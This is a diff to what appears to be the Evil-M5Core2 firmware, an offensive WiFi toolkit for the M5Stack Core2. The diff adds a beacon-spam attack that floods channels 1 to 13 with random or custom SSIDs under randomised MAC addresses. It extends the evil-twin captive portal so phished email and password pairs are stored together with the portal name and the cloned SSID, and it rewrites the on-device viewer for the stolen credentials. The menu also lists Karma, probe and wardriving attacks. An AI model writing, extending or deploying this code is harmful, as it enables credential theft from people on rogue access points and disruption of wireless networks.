@@ -70,7 +70,7 @@ const byte DNS_PORT = 53;
 
 int currentIndex = 0, lastIndex = -1;
 bool inMenu = true;
-const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Credentials", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Karma Auto", "Karma Spear", "Select Probe", "Delete Probe", "Delete All Probes", "Brightness", "Bluetooth ON/OFF", "Wardriving"};
+const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Credentials", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Karma Auto", "Karma Spear", "Select Probe", "Delete Probe", "Delete All Probes", "Brightness", "Bluetooth ON/OFF", "Wardriving", "Beacon Spam"};
 const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
 
 const int maxMenuDisplay = 10;
@@ -220,12 +220,13 @@ void setup() {
       break;
   }
 
+
   M5.Display.setTextSize(2);
   M5.Display.setTextColor(TFT_WHITE);
   M5.Display.setTextFont(1);
 
   const char* startUpMessages[] = {
-        "  There is no spoon...",
+    "  There is no spoon...",
     "    Hack the Planet!",
     " Accessing Mainframe...",
     "    Cracking Codes...",
@@ -437,10 +438,10 @@ if (batteryLevel < 15) {
   M5.Display.setCursor(75, textY + 20);
   M5.Display.println("By 7h30th3r0n3");
   M5.Display.setCursor(102, textY + 45);
-  M5.Display.println("v1.1.6 2024");
+  M5.Display.println("v1.1.7 2024");
   Serial.println("By 7h30th3r0n3");
   Serial.println("-------------------"); 
-  M5.Display.setCursor(0, textY + 120);
+  M5.Display.setCursor(0 , textY + 120);
   M5.Display.println(randomMessage);
   Serial.println(" ");
   Serial.println(randomMessage);
@@ -646,6 +647,9 @@ void executeMenuItem(int index) {
       break;
     case 19: 
       wardrivingMode();
+      break;
+    case 20: 
+      beaconAttack();
       break;
   }
   isOperationInProgress = false;
@@ -1317,18 +1321,18 @@ void createCaptivePortal() {
     isCaptivePortalOn = true;
 
     server.on("/", HTTP_GET, []() {
-        String email = server.arg("email");
-        String password = server.arg("password");
-        if (!email.isEmpty() && !password.isEmpty()) {
-            saveCredentials(email, password);
-            server.send(200, "text/plain", "Credentials Saved");
-        } else {
-            Serial.println("-------------------");
-            Serial.println("Direct Web Access !!!");
-            Serial.println("-------------------");
-            servePortalFile(selectedPortalFile);
-        }
-    });
+            String email = server.arg("email");
+            String password = server.arg("password");
+            if (!email.isEmpty() && !password.isEmpty()) {
+                saveCredentials(email, password, selectedPortalFile.substring(7), clonedSSID); // Assurez-vous d'utiliser les bons noms de variables
+                server.send(200, "text/plain", "Credentials Saved");
+            } else {
+                Serial.println("-------------------");
+                Serial.println("Direct Web Access !!!");
+                Serial.println("-------------------");
+                servePortalFile(selectedPortalFile);
+            }
+        });
 
 
     server.on("/evil-m5core2-menu", HTTP_GET, []() {
@@ -1748,23 +1752,27 @@ void servePortalFile(const String& filename) {
     }
 }
 
-void saveCredentials(const String& email, const String& password) {
+
+void saveCredentials(const String& email, const String& password, const String& portalName, const String& clonedSSID) {
     File file = SD.open("/credentials.txt", FILE_APPEND);
     if (file) {
-        file.println("Email:" + email);
-        file.println("Password:" + password);
+        file.println("-- Email -- \n" + email);
+        file.println("-- Password -- \n" + password);
+        file.println("-- Portal -- \n" + portalName); // Ajout du nom du portail
+        file.println("-- SSID -- \n" + clonedSSID); // Ajout du SSID cloné
         file.println("----------------------");
         file.close();
         Serial.println("-------------------");
         Serial.println(" !!! Credentials " + email + ":" + password + " saved !!! ");
+        Serial.println("On Portal Name: " + portalName);
+        Serial.println("With Cloned SSID: " + clonedSSID); 
         Serial.println("-------------------");
-        sendBLE("-------------------");
-        sendBLE(" !!! Credentials " + email + ":" + password + " saved !!! ");
-        sendBLE("-------------------");
     } else {
         Serial.println("Error opening file for writing");
     }
 }
+
+
 void stopCaptivePortal() {
   dnsServer.stop();
   server.stop();
@@ -1975,77 +1983,88 @@ void readCredentialsFromFile() {
 }
 
 void checkCredentials() {
-    readCredentialsFromFile();
-    if (numCredentials == 0) {
-        Serial.println("-------------------");
-        Serial.println("No credentials...");
-        Serial.println("-------------------");
-        waitAndReturnToMenu(" No credentials...");
-    } else {
-        const int lineHeight = 18; 
-        const int maxLineLength = M5.Display.width() / 13; 
-        const int listDisplayLimit = M5.Display.height() / lineHeight - 2;
+    readCredentialsFromFile(); // Assume this populates a global array or vector with credentials
 
-        int totalLines = 0;
-        int listStartIndex = 0;
-        for (int i = 0; i < numCredentials; i++) {
-            int linesNeeded = (credentialsList[i].length() + maxLineLength - 1) / maxLineLength;
-            if (i < currentListIndex) {
-                listStartIndex += linesNeeded;
-            }
-            totalLines += linesNeeded;
+    // Initial display setup
+    int currentListIndex = 0;
+    bool needDisplayUpdate = true;
+
+    while (true) {
+        if (needDisplayUpdate) {
+            displayCredentials(currentListIndex); // Function to display credentials on the screen
+            needDisplayUpdate = false;
         }
 
-        int listEndIndex = min(totalLines, listStartIndex + listDisplayLimit);
-        M5.Display.clear();
-        M5.Display.setTextSize(2);
+        M5.update();
+        handleDnsRequestSerial(); // Handle any background tasks
 
-        int displayY = 25;
-        int currentLine = 0;
-        for (int i = 0; i < numCredentials; i++) {
-            String credential = credentialsList[i];
-            int credentialLength = credential.length();
-            int linesNeeded = (credentialLength + maxLineLength - 1) / maxLineLength;
-
-            for (int line = 0; line < linesNeeded; line++) {
-                if (currentLine >= listStartIndex && currentLine < listEndIndex) {
-                    int startIndex = line * maxLineLength;
-                    int endIndex = min(startIndex + maxLineLength, credentialLength);
-                    String part = credential.substring(startIndex, endIndex);
-
-                    if (i == currentListIndex) {
-                        M5.Display.fillRect(0, displayY, M5.Display.width(), lineHeight, TFT_NAVY);
-                        M5.Display.setTextColor(TFT_GREEN);
-                    } else {
-                        M5.Display.setTextColor(TFT_WHITE);
-                    }
-
-                    M5.Display.setCursor(10, displayY);
-                    M5.Display.println(part);
-                    displayY += lineHeight;
-                }
-                currentLine++;
-            }
-            if (currentLine >= listEndIndex) break;
-        }
-        M5.Display.display();
-
-        while (!inMenu) {
-            M5.update();
-            handleDnsRequestSerial();
-            if (M5.BtnA.wasPressed()) {
-                currentListIndex = max(0, currentListIndex - 1);
-                checkCredentials();
-            } else if (M5.BtnC.wasPressed()) {
-                currentListIndex = min(numCredentials - 1, currentListIndex + 1);
-                checkCredentials();
-            } else if (M5.BtnB.wasPressed()) {
-                inMenu = true;
-                drawMenu(); 
-            }
+        // Navigation logic
+        if (M5.BtnA.wasPressed()) {
+            currentListIndex = max(0, currentListIndex - 1);
+            needDisplayUpdate = true;
+        } else if (M5.BtnC.wasPressed()) {
+            currentListIndex = min(numCredentials - 1, currentListIndex + 1);
+            needDisplayUpdate = true;
+        } else if (M5.BtnB.wasPressed()) {
+            // Exit or perform an action with the selected credential
+            break; // Exit the loop to return to the menu or do something with the selected credential
         }
     }
+
+    // Return to menu or next operation
+    inMenu = true; // Assuming this flag controls whether you're in the main menu
+    drawMenu(); // Redraw the main menu
 }
+
+void displayCredentials(int index) {
+    // Clear the display and set up text properties
+    M5.Display.clear();
+    M5.Display.setTextSize(2);
+
+    int maxVisibleLines = M5.Display.height() / 18; // Nombre maximum de lignes affichables à l'écran
+    int currentLine = 0; // Ligne actuelle en cours de traitement
+    int firstLineIndex = index; // Index de la première ligne de l'entrée sélectionnée
+    int linesBeforeIndex = 0; // Nombre de lignes avant l'index sélectionné
+
+    // Calculer combien de lignes sont nécessaires avant l'index sélectionné
+    for (int i = 0; i < index; i++) {
+        int neededLines = 1 + M5.Display.textWidth(credentialsList[i]) / (M5.Display.width() - 20);
+        linesBeforeIndex += neededLines;
+    }
+
+    // Ajuster l'index de la première ligne si nécessaire pour s'assurer que l'entrée sélectionnée est visible
+    while (linesBeforeIndex > 0 && linesBeforeIndex + maxVisibleLines - 1 < index) {
+        linesBeforeIndex--;
+        firstLineIndex--;
+    }
+
+    // Afficher les entrées de credentials visibles
+    for (int i = firstLineIndex; currentLine < maxVisibleLines && i < numCredentials; i++) {
+        String credential = credentialsList[i];
+        int neededLines = 1 + M5.Display.textWidth(credential) / (M5.Display.width() - 20);
+
+        if (i == index) {
+            M5.Display.fillRect(0, currentLine * 18, M5.Display.width(), 18 * neededLines, TFT_NAVY);
+        }
+
+        for (int line = 0; line < neededLines; line++) {
+            M5.Display.setCursor(10, (currentLine + line) * 18);
+            M5.Display.setTextColor(i == index ? TFT_GREEN : TFT_WHITE);
+
+            int startChar = line * (credential.length() / neededLines);
+            int endChar = min(credential.length(), startChar + (credential.length() / neededLines));
+            M5.Display.println(credential.substring(startChar, endChar));
+        }
+
+        currentLine += neededLines;
+    }
+
+    M5.Display.display();
+}
+
+
+
+
 
 bool confirmPopup(String message) {
   bool confirm = false;
@@ -2111,7 +2130,7 @@ int countPasswordsInFile() {
     int passwordCount = 0;
     while (file.available()) {
         String line = file.readStringUntil('\n');
-        if (line.startsWith("Password:")) {
+        if (line.startsWith("-- Password --")) {
             passwordCount++;
         }
     }
@@ -2339,7 +2358,7 @@ void displayMonitorPage3() {
       if (newBatteryLevel != oldBatteryLevel) {
           M5.Display.fillRect(10, 90, 200, 20, TFT_BLACK);
           M5.Display.setCursor(10, 90);
-          M5.Display.println("Batterie: " + newBatteryLevel + "%");
+          M5.Display.println("Battery: " + newBatteryLevel + "%");// thx to kdv88 to pointing mistranlastion
           oldBatteryLevel = newBatteryLevel;
       }
 
@@ -3817,9 +3836,9 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
 
 String createPreHeader() {
     String preHeader = "WigleWifi-1.4";
-    preHeader += ",appRelease=v1.1.6"; // Remplacez [version] par la version de votre application
+    preHeader += ",appRelease=v1.1.5"; // Remplacez [version] par la version de votre application
     preHeader += ",model=Core2";
-    preHeader += ",release=v1.1.6"; // Remplacez [release] par la version de l'OS de l'appareil
+    preHeader += ",release=v1.1.5"; // Remplacez [release] par la version de l'OS de l'appareil
     preHeader += ",device=Evil-M5Core2"; // Remplacez [device name] par un nom de périphérique, si souhaité
     preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
     preHeader += ",board=M5Stack Core2"; 
@@ -4020,6 +4039,7 @@ String formatTimeFromGPS() {
 void createKarmaList(int maxIndex) {
     
     std::set<std::string> uniqueSSIDs;
+    // Lire le contenu existant de KarmaList.txt et l'ajouter au set
     File karmaListRead = SD.open("/KarmaList.txt", FILE_READ);
     if (karmaListRead) {
         while (karmaListRead.available()) {
@@ -4049,6 +4069,7 @@ while (file.available()) {
 }
     file.close();
 
+    // Écrire le set dans KarmaList.txt
     File karmaListWrite = SD.open("/KarmaList.txt", FILE_WRITE);
 if (!karmaListWrite) {
     Serial.println("Error opening KarmaList.txt for writing");
@@ -4089,6 +4110,12 @@ int nthIndexOf(const String& str, char toFind, int nth) {
     return index;
 }
 
+void returnToMenu() {
+    // Mettez ici le code nécessaire pour nettoyer avant de retourner au menu
+    Serial.println("Returning to menu...");
+    // Supposer que waitAndReturnToMenu() est la fonction qui retourne au menu
+    waitAndReturnToMenu(" User requested return to menu.");
+}
 
 void karmaSpear() {
     isAutoKarmaActive = true;
@@ -4096,31 +4123,32 @@ void karmaSpear() {
     File karmaListFile = SD.open("/KarmaList.txt", FILE_READ);
     if (!karmaListFile) {
         Serial.println("Error opening KarmaList.txt");
-        waitAndReturnToMenu("Error opening KarmaList"); 
+        returnToMenu(); // Retour au menu si le fichier ne peut pas être ouvert
         return;
     }
     if (karmaListFile.available() == 0) {
         karmaListFile.close();
         Serial.println("KarmaFile empty.");
-        waitAndReturnToMenu("KarmaFile empty."); 
+        returnToMenu(); // Retour au menu si le fichier est vide
         return;
     }
 
+    // Compter le nombre total de lignes
     int totalLines = 0;
     while (karmaListFile.available()) {
         karmaListFile.readStringUntil('\n');
         totalLines++;
-        if (M5.BtnA.wasPressed()) { 
+        if (M5.BtnA.wasPressed()) { // Vérifie si btnA est pressé
             karmaListFile.close();
-            waitAndReturnToMenu("  Stopping...");
+            returnToMenu();
             return;
         }
     }
-    karmaListFile.seek(0); 
+    karmaListFile.seek(0); // Revenir au début du fichier après le comptage
 
     int currentLine = 0;
     while (karmaListFile.available()) {
-        if (M5.BtnA.isPressed()) { 
+        if (M5.BtnA.isPressed()) { // Vérifie régulièrement si btnA est pressé
             karmaListFile.close();
             isAutoKarmaActive = false;
             waitAndReturnToMenu(" Karma Spear Stopped.");
@@ -4135,6 +4163,7 @@ void karmaSpear() {
             Serial.println("Created Karma AP for SSID: " + ssid);
             displayAPStatus(ssid.c_str(), millis(), autoKarmaAPDuration);
 
+            // Mise à jour de l'affichage
             int remainingLines = totalLines - (++currentLine);
             String displayText = String(remainingLines) + "/" + String(totalLines);
             M5.Display.setCursor((M5.Display.width() / 2) - 25, 10);
@@ -4144,11 +4173,131 @@ void karmaSpear() {
                 M5.Display.clear();
                 break;
             }
-            delay(200);
+            delay(200); // Peut-être insérer une vérification de btnA ici aussi
         }
     }
     karmaListFile.close();
     isAutoKarmaActive = false;
     Serial.println("Karma Spear Failed...");
     waitAndReturnToMenu(" Karma Spear Failed...");
+}
+
+
+
+
+
+// beacon attack 
+
+std::vector<String> readCustomBeacons(const char* filename) {
+    File file = SD.open(filename, FILE_READ);
+    std::vector<String> customBeacons;
+
+    if (!file) {
+        Serial.println("Failed to open file for reading");
+        return customBeacons;
+    }
+
+    while (file.available()) {
+        String line = file.readStringUntil('\n');
+        if (line.startsWith("CustomBeacons=")) {
+            String beaconsStr = line.substring(String("CustomBeacons=").length());
+            int idx = 0;
+            while ((idx = beaconsStr.indexOf(',')) != -1) {
+                customBeacons.push_back(beaconsStr.substring(0, idx));
+                beaconsStr = beaconsStr.substring(idx + 1);
+            }
+            if (beaconsStr.length() > 0) {
+                customBeacons.push_back(beaconsStr); // Ajouter le dernier élément
+            }
+            break;
+        }
+    }
+    file.close();
+    return customBeacons;
+}
+
+void beaconAttack() {
+    WiFi.mode(WIFI_MODE_AP);
+
+    // Demander à l'utilisateur s'il souhaite utiliser des beacons personnalisés
+    bool useCustomBeacons = confirmPopup("Use custom beacons?");
+    M5.Display.clear();
+    
+    std::vector<String> customBeacons;
+    if (useCustomBeacons) {
+        customBeacons = readCustomBeacons("/config/config.txt"); // Remplacer par le chemin réel
+    }
+
+    int beaconCount = 0;
+    unsigned long previousMillis = 0;
+    int delayTimeBeacon = 0; // Délai entre les beacons
+    const int debounceDelay = 200; 
+    unsigned long lastDebounceTime = 0;
+    
+    M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
+    M5.Display.setCursor(135, M5.Display.height() - 40);
+    M5.Display.setTextColor(TFT_WHITE);
+    M5.Display.println("Stop");
+    
+    int beaconTextX = 10;
+    String beaconText = "Beacon Spam running...";
+    M5.Display.setCursor(beaconTextX, 50);
+    M5.Display.println(beaconText);
+    beaconText = "Beacon sent:" ;
+    M5.Display.setCursor(beaconTextX, 70);
+    M5.Display.print(beaconText);
+    Serial.println("-------------------");
+    Serial.println("Starting Beacon Spam");
+    Serial.println("-------------------");
+    
+while (!M5.BtnB.isPressed()) {
+    unsigned long currentMillis = millis();
+    if (currentMillis - previousMillis >= delayTimeBeacon) {
+        previousMillis = currentMillis;
+        // Générer un nouveau SSID pour le beacon
+        String ssid;
+        if (!customBeacons.empty()) {
+            ssid = customBeacons[beaconCount % customBeacons.size()]; // Utiliser un beacon personnalisé
+        } else {
+            ssid = generateRandomSSID(32); // Utiliser un beacon aléatoire
+        }
+
+        // Effacer la zone d'affichage précédente de l'SSID
+        int x = 5; 
+        int y = 90; 
+        int width = M5.Display.width(); 
+        int height = 20; // Hauteur du rectangle
+        M5.Display.fillRect(x, y, width, height, TFT_BLACK);
+
+        // Réécrire le nouvel SSID
+        M5.Display.setCursor(x, y);
+        M5.Display.setTextSize(1.5);
+        M5.Display.print(ssid);
+        M5.Display.setTextSize(2);
+        WiFi.softAP(ssid.c_str());
+        delay(50);
+        for (int channel = 1; channel <= 13; ++channel) {
+            setRandomMAC_APKarma();
+            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+            delay(100);
+          if (M5.BtnB.isPressed()) {
+            break;
+          }
+        }
+        delay(50);
+
+        beaconCount++;
+        }
+
+       M5.update();
+      if (M5.BtnB.isPressed() && currentMillis - lastDebounceTime > debounceDelay) {
+          break;
+      }
+        delay(10);
+    }
+      Serial.println("-------------------");
+      Serial.println("Stopping beacon Spam");
+      Serial.println("-------------------");
+      restoreOriginalWiFiSettings();
+      waitAndReturnToMenu("Beacon Spam Stopped...");
 }
